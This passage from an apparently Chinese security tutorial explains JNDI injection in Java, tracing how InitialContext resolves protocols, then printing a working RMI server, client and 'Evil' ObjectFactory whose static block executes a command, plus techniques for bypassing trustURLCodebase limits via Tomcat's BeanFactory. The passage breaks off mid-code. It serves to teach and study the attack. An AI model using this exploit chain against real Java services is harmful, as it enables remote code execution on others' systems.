class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleReferenceDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;a&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><font style="color:#000000;">以上文中InitialContext为例：</font></p><p><font style="color:#000000;">首先，使用Hashtable类来设置属性INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值，初始化了一个上下文。</font></p><p><font style="color:#000000;">接着，定义了两个环境值，一个是INITIAL_CONTEXT_FACTORY，值为com.sun.jndi.dns.DnsContextFactoryDnsContext的工厂类，同时，INITIAL_CONTEXT_FACTORY也决定了JNDI上下文的实际协议；一个是PROVIDER_URL，值为DNS服务器的URL地址。</font></p><p><font style="color:#000000;">最后，实例化InitialContext类并将设置好的属性值传入来初始化一个Context，此时便获得了一个与DNS服务相关联的上下文Context。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleInitialContextDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://a952d10bd0.ipv6.1433.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            ctx.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体流程如下：</p><p>在<font style="color:#000000;">实例化InitialContext类处下断点，跟进javax.naming.InitialContext#InitialContext方法，通过传入的属性值进行初始化操作。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730773370535-9d94ca1f-65a4-4a60-b503-4d41d54bb8af.png"></p><p>跟进init方法，调用javax.naming.InitialContext#getDefaultInitCtx方法。</p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730774698222-529a353e-ee84-49a0-bfd6-f41233d9cd0f.png"></p><p><font style="color:#000000;">跟进getDefaultInitCtx方法，调用javax.naming.spi.NamingManager#getInitialContext方法。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730774739134-93bfd43a-e8ea-4b0c-bfea-2aebafc81352.png"></p><p><font style="color:#000000;">跟进getInitialContext方法，先调用getInitialContextFactoryBuilder方法初始化了一个InitialContextFactoryBuilder类，如果initctx_factory_builder为null，则将className设置为INITIAL_CONTEXT_FACTORY属性，即手动设置的DNS上下文工厂类com.sun.jndi.dns.DnsContextFactory。</font></p><p><font style="color:#000000;">接着，通过loadClass方法来动态加载设置的工厂类，最终调用Rcom.sun.jndi.dns.DnsContextFactory#getInitialContext方法，通过设置工厂类来初始化上下文Context。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730775227588-4e3fcf79-572d-452e-861a-fb5be405db70.png"></p><p><font style="color:#000000;">跟进DnsContextFactory#getInitialContext方法，该处的var1的值为设置的环境变量。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730775670222-2845bde1-fc26-43eb-9509-9489d0283f55.png"></p><p><font style="color:#000000;">跟进com.sun.jndi.dns.DnsContextFactory#getInitCtxUrl方法，通过java.naming.provider.url的值来获取服务的路径。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730775808278-aa881e17-7879-44a4-a456-67271cf5f3c9.png"></p><p><font style="color:#000000;">最终初始化了一个DnsContext，获取了与服务交互所需的资源，接着通过获取到的资源与服务进行交互。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730776036618-dacf448e-7627-4ae5-a3c5-4887d629dc50.png"></p><h2 id="动态协议转换"><a href="#动态协议转换" class="headerlink" title="动态协议转换"></a>动态协议转换</h2><p><font style="color:#000000;">在上文分析的示例代码，通过手动设置属性INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值来初始化上下文。实际上，在Context#lookup方法的参数中，可以指定查找协议，JNDI会通过用户的输入来动态的识别要调用的服务以及路径。</font></p><p><font style="color:#000000;">示例代码如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RmiDemo</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RmiDemo</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RmiDemoImpl</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiDemoImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RmiDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RmiDemoImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RMI Called...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SimpleRmiDemo</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleRmiDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rmiUrl</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/hello&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RmiDemo</span> <span class="variable">rmiDemo</span> <span class="operator">=</span> (RmiDemo) initialContext.lookup(rmiUrl);</span><br><span class="line">        rmiDemo.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在调用lookup方法处下断点，跟进javax.naming.InitialContext#lookup方法。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730790710373-709068ed-474c-48e9-aa63-7cd6ae9f32a9.png"></p><p><font style="color:#000000;">继续跟进javax.naming.InitialContext#getURLOrDefaultInitCtx方法，会调用javax.naming.InitialContext#getURLScheme方法解析出使用的协议，接着传入javax.naming.spi.NamingManager#getURLContext方法，根据defaultPkgPrefix属性动态生成Factory类，根据协议获取对应的Context。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730791193512-ba41d5a1-0e0f-4c83-b5ef-a84dce95af0e.png"></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730791784814-cf16b8d5-75a1-42ed-9ad2-c28ca41a1fc1.png"></p><p><font style="color:#000000;">通过动态协议转换，可以仅通过一串特定字符串就指定JNDI调用何种服务，十分便捷。但是，在示例代码中，假如能够控制rmiUrl字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的“远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。</font></p><p><font style="color:#000000;">JNDI默认支持的动态协议转换有如下几种，针对JNDI进行攻击的时候可以优先考虑以下几种服务。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730792164188-a91dbed9-9b3a-479a-b563-628f9659fd8f.png"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p><font style="color:#000000;">在上文的工作流程分析中可以看到，当传入lookup函数的参数控制不当时，则有可能导致加载远程恶意类，JNDI攻击流程如下图所示。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730798860672-8c232961-73eb-436a-8cd0-658fa7aaab0b.png"></p><p><font style="color:#000000;">对于JNDI注入，在后续的JDK版本中对于RMI&#x2F;LDAP两个攻击方式都做了默认情况的限制。</font></p><ol><li><font style="color:#000000;">RMI：</font><strong><font style="color:#000000;">从JDK 6u132、7u122、8u113及更高版本开始，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false</font></strong><font style="color:#000000;">，它可以防止通过JNDI获取的RMI对象从远程提供的代码库URL自动加载类定义。</font></li></ol><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730799507237-b672b9fe-e77e-43fc-8b2d-12984989e860.webp.png"></p><ol start="2"><li><font style="color:#000000;">LDAP：</font><strong><font style="color:#000000;">从JDK 6u211、7u201、11.0.1、8u191及更高版本开始，com.sun.jndi.ldap.object.trustURLCodebase的默认值为false</font></strong><font style="color:#000000;">，禁用从远程位置自动加载通过JNDI中的LDAP服务检索对象的Java类定义。</font></li></ol><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730799589786-b7121d5b-56c5-481c-9fee-fd590e0cdb68.webp.png"></p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本JDK"><a href="#低版本JDK" class="headerlink" title="低版本JDK"></a>低版本JDK</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server Code</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">factoryUrl</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8080/&quot;</span>;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;Evil&quot;</span>, factoryUrl);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>, referenceWrapper);</span><br><span class="line">        System.err.println(<span class="string">&quot;RMI Server Ready: &quot;</span> + factoryUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rmiUrl</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/calc&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(rmiUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Evil Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730807053979-5547cd13-cfde-4387-938e-ddecf08d2262.png"></p><h4 id="高版本JDK"><a href="#高版本JDK" class="headerlink" title="高版本JDK"></a>高版本JDK</h4><p><font style="color:#000000;">在高版本运行Client代码时会抛出如下异常，上文也提到了，从JDK 6u132、7u122、8u113及更高版本开始，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false，它可以防止通过JNDI获取的RMI对象从远程提供的代码库URL自动加载类定义。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> javax.naming.ConfigurationException: The object factory is untrusted. Set the system property <span class="string">&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27;</span> to <span class="string">&#x27;true&#x27;</span>.</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:<span class="number">495</span>)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:<span class="number">138</span>)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:<span class="number">217</span>)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:<span class="number">417</span>)</span><br><span class="line">at org.example.jndi.RmiClient.main(RmiClient.java:<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">那么有什么方式可以绕过该限制嘛？答案显然是有的，在抛出的异常中可以看到，高版本JDK无法加载远程代码是在com.sun.jndi.rmi.registry.RegistryContext#decodeObject方法中出现问题。</font></p><p><font style="color:#000000;">进入异常抛出的逻辑语句的前提是满足</font><strong><font style="color:#000000;background-color:#ffffff;">var8 !&#x3D; null &amp;&amp; var8.getFactoryClassLocation() !&#x3D; null &amp;&amp; !trustURLCodebase</font></strong><font style="color:#000000;background-color:#ffffff;">，那么为了绕过ConfigurationException的限制，可以从三个角度出发，即令var &#x3D;&#x3D; null，或者令var8.getFactoryClassLocation() &#x3D;&#x3D; null，或者令trustURLCodebase的值为true。</font></p><ol><li><font style="color:#000000;">方法一：令var8为null，从语义上看需要var3既不是Reference也不是Referenceable。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程RMI没有操作的空间，因此这种情况不太好利用。</font></li><li><font style="color:#000000;">方法二：令var8.getFactoryClassLocation()的返回结果null。即，让var8对象的classFactoryLocation属性为空，这个属性表示引用所指向对象的对应factory名称，对于远程代码加载而言是codebase，即远程代码的URL地址，这正是上文针对低版本的利用方法；如果对应的factory是本地代码，则该值为空，这是绕过高版本JDK限制的关键。</font></li><li><font style="color:#000000;">方法三：在命令行指定com.sun.jndi.rmi.object.trustURLCodebase参数为true即可。</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            var8 = (Reference)var3;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var8 != <span class="literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">上文提到了</font><strong><font style="color:#000000;">绕过高版本JDK限制的关键是利用本地的Reference Factory类</font></strong><font style="color:#000000;">。要满足方法二的理由前提，只需要在远程RMI服务器返回的Reference对象中不指定Factory的codebase。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730864293075-c7ef2851-dd1d-4e18-b1b9-4712f2fdde55.png"></p><p><font style="color:#000000;">接着看看javax.naming.spi.NamingManager#getObjectInstance方法，在处理Reference对象时，先调用</font><font style="color:#000000;background-color:#ffffff;">getFactoryClassName方法获取对应工厂类的名称，即先在本地的CLASSPATH中寻找该类，如果找到了的话直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果没找到则通过网络请求来获取。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730864561120-3c6eb37b-e7f1-4da7-93ad-30c977ce5716.png"></p><p><font style="color:#000000;">之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法，因此只需要在攻击者本地CLASSPATH找到这个Reference Factory类，并且在这四个地方其中一块能执行Payload即可。</font></p><p><font style="color:#000000;">在javax.naming.spi.NamingManager#getObjectFactoryFromReference的return语句中，对Factory类的实例对象进行了类型转换，因此利用的本地工厂类需要实现javax.naming.spi.ObjectFactory接口，并且该工厂类至少存在一个getObjectInstance方法。</font></p><p><img src="/2024/03/14/JNDI%E6%B3%A8%E5%85%A5/1730865087517-3ca4105f-bfbf-414f-8c2e-66b36d74e1da.png"></p><p><font style="color:#000000;">整个利用过程的主要调用栈如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#lookup()</span><br><span class="line">RegistryContext#lookup()</span><br><span class="line">RegistryContext#decodeObject()</span><br><span class="line">NamingManager#getObjectInstance()</span><br><span class="line">objectfactory = NamingManager#getObjectFactoryFromReference()</span><br><span class="line">Class#newInstance()或objectfactory#getObjectInstance()</span><br></pre></td></tr></table></figure><h5 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h5><p><font style="color:#000000;">存在于Tomcat依赖包中的org.apache.naming.factory.BeanFactory就是满足条件之一，org.apache.naming.factory.BeanFactory在getObjectInstance方法中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line">    <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. 反射获取类对象</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 初始化类实例</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span></span><br><span class="line">    <span class="type">RefAddr</span> <span 